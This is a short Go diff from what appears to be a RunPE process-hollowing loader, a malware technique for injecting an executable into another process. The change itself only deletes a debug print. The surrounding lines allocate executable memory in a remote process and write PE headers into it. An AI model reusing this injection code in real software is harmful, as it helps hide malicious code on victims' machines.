@@ -79,7 +79,6 @@ func RunPE(srcPath string, destPE []byte, console bool) {
 
 	newImageBase, err := virtualAllocEx(uintptr(hProcess), baseAddr, oh.SizeOfImage, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
 	CheckErr(err)
-	fmt.Println("a")
 	fmt.Printf("[+] New base address %x\n", newImageBase)
 	fmt.Printf("[*] Writing PE to memory in process at %x (size: %v)\n", newImageBase, oh.SizeOfHeaders)
 	err = writeProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
